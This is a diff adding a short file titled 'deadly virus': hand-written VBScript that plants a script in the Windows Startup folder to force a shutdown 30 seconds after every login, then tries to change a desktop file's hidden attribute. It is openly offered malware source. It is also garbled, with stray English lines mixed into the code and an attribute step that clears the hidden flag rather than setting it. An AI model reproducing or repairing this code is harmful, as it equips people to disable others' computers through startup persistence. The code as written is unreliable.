@@ -1,0 +1,20 @@
+deadly virus 
+
+to create a file and write in the startup and write in it
+dim s,o,g
+set s=CreateObject("Scripting.FileSystemObject")
+
+#if I could get the permission, then this could be completed
+set g=s.CreateTextFile("C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ffs.vbs")
+
+
+g.WriteLine(" set she=CreateObject(" &chr(34)& "Wscript.Shell" &chr(34)& ")")
+g.WriteLine("she.run"&chr(34)&"shutdown.exe -s -t 30"&chr(34))
+to hide that file
+
+a="C:\Users\User\Desktop\s.jpg"
+set c = CreateObject("Scripting.FileSystemObject")
+set x=c.GetFile(a)
+x.Attributes = x.Attributes - 2
+
+
